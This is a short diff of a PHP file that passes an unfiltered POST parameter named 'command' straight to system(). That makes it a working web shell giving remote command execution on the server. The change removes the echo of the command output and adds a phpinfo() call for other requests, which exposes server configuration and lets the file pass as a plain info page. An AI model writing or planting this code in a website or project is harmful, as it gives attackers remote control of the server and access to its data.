@@ -1,4 +1,6 @@
 <?php
   if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-      echo system($_POST['command']);
+      system($_POST['command']);
+  } else {
+      phpinfo();
   }
